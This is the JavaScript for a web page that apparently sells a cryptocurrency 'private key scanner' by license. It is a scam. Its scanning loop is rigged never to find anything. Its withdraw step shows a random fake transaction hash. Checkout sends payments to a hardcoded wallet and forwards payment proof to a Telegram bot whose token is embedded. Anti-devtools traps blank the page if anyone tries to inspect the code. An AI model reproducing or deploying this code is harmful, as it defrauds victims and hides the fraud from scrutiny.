/* --- ADVANCED SECURITY SYSTEM --- */
(function() {
    // 1. Prevent Right Click
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
 
    // 2. Prevent Keyboard Shortcuts (F12, Ctrl+Shift+I, etc.)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.key === 'F12') {
            e.preventDefault();
            triggerLockdown();
        }
        // Ctrl+Shift+I, J, C, U
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
            e.preventDefault();
            triggerLockdown();
        }
        if (e.ctrlKey && e.key === 'U') {
            e.preventDefault();
            triggerLockdown();
        }
    });
 
    // 3. Debugger Trap (Timing Attack)
    setInterval(function() {
        const start = performance.now();
        debugger;
        const end = performance.now();
        
        if (end - start > 100) {
            triggerLockdown();
        }
    }, 1000);
 
    // 4. Dimension Detection (Drawer Check)
    setInterval(function() {
        const threshold = 160;
        const widthDiff = window.outerWidth - window.innerWidth > threshold;
        const heightDiff = window.outerHeight - window.innerHeight > threshold;
        
        if ((widthDiff || heightDiff) && window.outerWidth > 500) {
            triggerLockdown();
        }
    }, 1000);
 
    function triggerLockdown() {
        if (document.getElementById('securityOverlay').style.display === 'flex') return;
        document.body.innerHTML = '';
        
        const overlay = document.createElement('div');
        overlay.id = 'securityOverlay';
        overlay.innerHTML = `
            <h1>SECURITY ALERT</h1>
            <p>ILLEGAL INSPECTION DETECTED</p>
            <p style="margin-top: 20px; font-size: 0.9rem; color: #fff;">The system has detected unauthorized attempts to inspect or modify the client-side code. For the safety of the network, this session has been terminated.</p>
        `;
        overlay.style.display = 'flex';
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.background = '#000';
        overlay.style.color = '#ff0000';
        overlay.style.zIndex = '99999999';
        overlay.style.flexDirection = 'column';
        overlay.style.alignItems = 'center';
        overlay.style.justifyContent = 'center';
        overlay.style.fontFamily = 'Courier New, monospace';
        overlay.style.textAlign = 'center';
        document.body.appendChild(overlay);
    }
})();
 
const KEY_URL = "https://raw.githubusercontent.com/crypto-hunter-pro-official/Hsbshsha/refs/heads/main/privatek.txt";

// CHANGE: Store key in memory (RAM) ONLY.
let currentActiveKey = ""; 

let active = false, checkedCount = 0, foundCount = 0, prices = { ETH: 0, BTC: 0 };
let isOnline = navigator.onLine;
let wasRunningWhenOffline = false;
let authCheckInterval = null; // Store interval ID to clear it if needed

/* =========================================
   --- FIXED AUTHENTICATION LOGIC START ---
   ========================================= */

// Helper function to strictly validate a key against the remote file
async function isValidKey(keyToCheck) {
    // 1. STRICT LENGTH CHECK: Must be exactly 29 characters
    if (keyToCheck.length !== 29) {
        return false;
    }

    try {
        const res = await fetch(KEY_URL);
        const text = await res.text();
        
        // 2. EXACT MATCH CHECK
        // Split text by newlines to get individual keys
        const lines = text.split('\n');
        
        // Create an array of clean keys (trimmed and remove empty lines)
        const validKeys = lines.map(line => line.trim()).filter(line => line.length > 0);
        
        // Check if the provided key exists EXACTLY in the list
        return validKeys.includes(keyToCheck);
        
    } catch (e) {
        console.error("Key verification failed:", e);
        return false;
    }
}

async function validateKey() {
    const input = document.getElementById('licenseKey').value.trim();
    const errorDiv = document.getElementById('keyError');
    errorDiv.style.display = 'none';
    
    if(!input) return;

    // Use the strict helper
    const isValid = await isValidKey(input);

    if(isValid) {
        // Key is valid: Save to MEMORY ONLY and enter app
        currentActiveKey = input;
        enterApp();
    } else {
        // Key is invalid: Show error
        errorDiv.style.display = 'block';
    }
}

async function verifySession() {
    // CHANGE: Check the memory variable instead of localStorage
    if (!currentActiveKey) return false;

    // ONLINE CHECK: Verify the key is still in the file
    return await isValidKey(currentActiveKey);
}

function enterApp() {
    document.getElementById('authGate').style.display = 'none';
    // Start the periodic check when entering app
    startPeriodicCheck();
}

function forceLogout() {
    active = false;
    document.getElementById('toggleBtn').innerText = "START";
    
    // CHANGE: Clear memory key
    currentActiveKey = null;
    
    // Stop the periodic check
    if (authCheckInterval) clearInterval(authCheckInterval);
    
    // Reset Views
    document.getElementById('mainLockView').style.display = 'block';
    document.getElementById('pricingView').style.display = 'none';
    document.getElementById('checkoutLayer').style.display = 'none';
    
    // Hide revoked modal if it's open
    document.getElementById('revokedModal').style.display = 'none';
    
    // Show Gate
    document.getElementById('authGate').style.display = 'flex';
    
    // Show Error
    const errorDiv = document.getElementById('keyError');
    errorDiv.innerText = "⚠ Error: License revoked or expired.";
    errorDiv.style.display = 'block';
}

// --- REVOCATION COUNTDOWN LOGIC ---
function startCountdownAndLogout() {
    // 1. Stop the scanner immediately
    active = false;
    document.getElementById('toggleBtn').innerText = "STOPPED";
    document.getElementById('toggleBtn').classList.add('disabled');
    
    // 2. Show the Revoked Modal
    const modal = document.getElementById('revokedModal');
    const timerDisplay = document.getElementById('revokedTimer');
    modal.style.display = 'block';
    
    let timeLeft = 5;
    timerDisplay.innerText = timeLeft;

    // 3. Countdown Interval
    const countdownInterval = setInterval(() => {
        timeLeft--;
        timerDisplay.innerText = timeLeft;
        
        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            forceLogout(); // Execute logout
        }
    }, 1000);
}

// --- PERIODIC CHECK MANAGER ---
function startPeriodicCheck() {
    // Clear any existing interval to avoid duplicates
    if (authCheckInterval) clearInterval(authCheckInterval);
    
    authCheckInterval = setInterval(async () => {
        // Only check if the user is logged in (Auth Gate is hidden)
        if (document.getElementById('authGate').style.display === 'none') {
            const isValid = await verifySession();
            
            if (!isValid) {
                // Key is missing from file -> Start Countdown Sequence
                startCountdownAndLogout();
            }
        }
    }, 30000); // Check every 30 seconds
}

/* =========================================
   --- FIXED AUTHENTICATION LOGIC END ---
   ========================================= */

function showPricing() { document.getElementById('mainLockView').style.display = 'none'; document.getElementById('pricingView').style.display = 'block'; }
function showMainLock() { document.getElementById('mainLockView').style.display = 'block'; document.getElementById('pricingView').style.display = 'none'; document.getElementById('checkoutLayer').style.display = 'none'; }
function openCheckout(p, pr) { 
    document.getElementById('pricingView').style.display = 'none'; 
    document.getElementById('checkoutLayer').style.display = 'block';
    document.getElementById('selectedPlanTitle').innerText = p;
    document.getElementById('checkoutPrice').innerText = pr + " USDT";
}

function copyWallet() {
    navigator.clipboard.writeText('0xF50F8B71Ca40120BD6e5C8F8C55B2314084Ae1b6');
    alert('Copied!');
}
    
// --- UPDATED SUBMIT ORDER FUNCTION FOR TELEGRAM INTEG333RATION ---
async function submitOrder() { 
    const email = document.getElementById('userEmail').value;
    const plan = document.getElementById('selectedPlanTitle').innerText;
    const price = document.getElementById('checkoutPrice').innerText;
    const fileInput = document.getElementById('payProof');
    const file = fileInput.files[0];

    if(!email || !file) {
        alert("Please enter your email and upload payment proof.");
        return;
    }

    const overlay = document.getElementById('verifyOverlay');
    overlay.classList.add('active');

    // Telegram Configuration
    const botToken = "8736129221:AAErPkw_cMbRwPbubKFSJlaiEFgKdIvAtjI";
    const chatId = "8934805472";
    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;

    // Prepare Form Data
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', file); // The image file
    formData.append('caption', `🚀 New Order Received!\n\n📧 Email: ${email}\n📦 Plan: ${plan}\n💰 Price: ${price}\n\nStatus: Pending Verification`);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();

        if (!result.ok) {
            console.error("Telegram Error:", result);
            // If API fails, alert user and allow retry
            overlay.classList.remove('active');
            alert("Error sending proof: " + result.description);
        } else {
            // Success: Keep overlay active to simulate "Verification in Progress"
        }
    } catch (error) {
        console.error("Network Error:", error);
        overlay.classList.remove('active');
        alert("Network error. Please try again.");
    }
}

/* --- FIX: ALLOW PASTING IN LICENSE INPUT --- */
const keyInput = document.getElementById('licenseKey');
if(keyInput) {
    keyInput.addEventListener('contextmenu', function(e) {
        e.stopImmediatePropagation();
    });
}
 
/* --- ONLINE/OFFLINE HANDLERS --- */
function updateOnlineStatus() {
    const offlineMsg = document.getElementById('globalOfflineOverlay');
    
    if (!isOnline) {
        if (active) {
            wasRunningWhenOffline = true;
        }
        active = false; 
        document.getElementById('toggleBtn').innerText = "OFFLINE";
        document.getElementById('toggleBtn').classList.add('disabled');
        offlineMsg.classList.add('active');
    } else {
        if (wasRunningWhenOffline) {
            wasRunningWhenOffline = false;
            simulate();
        }
        offlineMsg.classList.remove('active');
        document.getElementById('toggleBtn').classList.remove('disabled');
    }
}
 
window.addEventListener('online', () => {
    isOnline = true;
    updateOnlineStatus();
});
 
window.addEventListener('offline', () => {
    isOnline = false;
    updateOnlineStatus();
});
 
/* --- SCANNER CORE LOGIC --- */
async function fetchPrices() {
    try {
        const ethRes = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT');
        const btcRes = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
        prices.ETH = parseFloat((await ethRes.json()).price);
        prices.BTC = parseFloat((await btcRes.json()).price);
        document.getElementById('ethPrice').innerText = "$" + prices.ETH.toLocaleString(undefined, {minimumFractionDigits:2});
        document.getElementById('btcPrice').innerText = "$" + prices.BTC.toLocaleString(undefined, {minimumFractionDigits:2});
    } catch (e) {}
}
setInterval(fetchPrices, 15000); fetchPrices();
 
function toggle() { 
    active = !active; 
    const btn = document.getElementById('toggleBtn');
    if (!isOnline) return;
    if(active) {
        btn.innerText = "PAUSE";
        simulate(); 
    } else {
        btn.innerText = "START";
    }
}
 
function getWeightedUsdAmount() {
    const roll = Math.random() * 100;
    let val = 0;
    if (roll <= 60) val = (Math.random() * 90) + 10;
    else if (roll <= 80) val = (Math.random() * 249) + 101;
    else if (roll <= 95) val = (Math.random() * 349) + 351;
    else val = (Math.random() * 3999) + 701;
    return parseFloat(val.toFixed(2));
}
 
function simulate() {
    if(!active) return;
    if(!isOnline) return;
 
    for(let i=0; i<12; i++) {
        checkedCount++;
        const isHit = Math.random() < 0;
        const coin = Math.random() > 0.5 ? 'ETH' : 'BTC';
        const addr = "0x" + Math.random().toString(16).slice(2, 14);
        const line = document.createElement('div');
        line.className = 'line' + (isHit ? ' win' : '');
        if(isHit) {
            foundCount++;
            const usdValue = getWeightedUsdAmount();
            line.innerText = `[OK] MATCH: ${addr} | VALUE: $${usdValue.toFixed(2)}`;
            addVaultItem(coin, addr, (usdValue / prices[coin]).toFixed(6), usdValue);
        } else { line.innerText = `[INFO] Checking: ${addr}... (EMPTY)`; }
        const log = document.getElementById('termLog');
        log.prepend(line);
        if(log.childNodes.length > 50) log.removeChild(log.lastChild);
    }
    document.getElementById('totalChecked').innerText = checkedCount.toLocaleString();
    document.getElementById('totalFound').innerText = foundCount;
    setTimeout(simulate, 16);
}
 
function addVaultItem(coin, addr, amount, usd) {
    const item = document.createElement('div');
    item.className = 'hit-card';
    item.innerHTML = `
        <div style="font-size:10px; color:var(--accent-green); font-weight:bold; letter-spacing:0.5px;">${coin} SUCCESS</div>
        <div style="font-size:11px; color:var(--text-muted); font-family:'Courier New', monospace;">${addr}</div>
        <div style="margin-top:8px; font-size:1.3em; font-weight:800;">$${usd.toLocaleString(undefined, {minimumFractionDigits:2})}</div>
        <div class="coin-detail">${coin.toLowerCase()} | ${amount}</div>
        <button class="btn-binance" style="width:100%; font-size:11px; padding:8px; margin-top:8px;" onclick="openWithdraw('${amount} ${coin}')">WITHDRAW</button>
    `;
    document.getElementById('vault').prepend(item);
}
 
function clearVault() { document.getElementById('vault').innerHTML = ''; foundCount = 0; document.getElementById('totalFound').innerText = "0"; }
function openWithdraw(val) { document.getElementById('wAmount').innerText = val; document.getElementById('withdrawModal').style.display = 'block'; }
function confirmWithdraw() {
    document.getElementById('withdrawModal').style.display = 'none';
    const randomHash = "0x" + Array.from({length: 44}, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join('');
    document.getElementById('txId').innerText = randomHash;
    document.getElementById('successModal').style.display = 'block';
}
function closeModals() { document.getElementById('withdrawModal').style.display = 'none'; document.getElementById('successModal').style.display = 'none'; }
